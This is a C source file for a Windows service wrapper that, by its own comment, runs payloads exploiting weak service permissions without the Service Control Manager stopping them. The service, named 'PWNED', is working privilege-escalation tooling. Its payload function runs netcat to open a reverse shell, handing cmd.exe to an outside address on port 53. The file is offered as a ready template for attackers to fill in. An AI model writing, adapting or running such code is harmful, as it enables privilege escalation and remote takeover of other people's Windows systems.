/*
	Service wrapper for running payloads exploting Windows services weak permissions without being terminated by the SCM.
	All you need to do is modify the SERVICE_NAME macro and add your code to the payload function.
	Note that depending on the target service, it might be necessary to add some control event processing to the service handler,
	otherwise the SCM will not be happy.
*/

#include <windows.h>
#include <lm.h>

#define SERVICE_NAME "PWNED"

void WINAPI PwnedServiceCtrlHandler(DWORD opcode);
void PwnedServiceStart(DWORD argc, LPTSTR *argv);
DWORD InvokePayload();

SERVICE_STATUS PwnedServiceStatus;
SERVICE_STATUS_HANDLE PwnedServiceStatusHandle;
HANDLE Stop_Event;

int main(int argc, char **argv)
{
	SERVICE_TABLE_ENTRYA DispatchTable[] = { 
											   {SERVICE_NAME     , (LPSERVICE_MAIN_FUNCTIONA)PwnedServiceStart}, 
											   {NULL             ,  NULL}
	                                       };
	
	if(!StartServiceCtrlDispatcherA(DispatchTable))
		
		return EXIT_FAILURE;

	else
		
		return 0;
	

}


void PwnedServiceStart(DWORD argc, LPTSTR *argv)
{

		PwnedServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
		PwnedServiceStatus.dwCurrentState = SERVICE_START_PENDING;
		PwnedServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP; 
		PwnedServiceStatus.dwWin32ExitCode = 0;
		PwnedServiceStatus.dwServiceSpecificExitCode = 0;
		PwnedServiceStatus.dwCheckPoint = 0;
		PwnedServiceStatus.dwWaitHint = 0;

		PwnedServiceStatusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, PwnedServiceCtrlHandler);

		PwnedServiceStatus.dwCurrentState = SERVICE_RUNNING;
		PwnedServiceStatus.dwCheckPoint = 0;
		PwnedServiceStatus.dwWaitHint = 0;
		SetServiceStatus(PwnedServiceStatusHandle, &PwnedServiceStatus);		
	
		InvokePayload();
		
		
		return;
}

void WINAPI PwnedServiceCtrlHandler(DWORD opcode){

	switch(opcode){
	
		case SERVICE_CONTROL_STOP:
			PwnedServiceStatus.dwCurrentState = SERVICE_STOPPED;
			PwnedServiceStatus.dwWaitHint = 0;
			PwnedServiceStatus.dwCheckPoint = 0;
			PwnedServiceStatus.dwWin32ExitCode = 0;
			SetServiceStatus(PwnedServiceStatusHandle, &PwnedServiceStatus);
		
      
			break;

	}

	return ;
}

DWORD InvokePayload(){

	 system("C:\\nc.exe -d 172.16.188.156 53 -e cmd.exe");

	 return GetLastError();
}
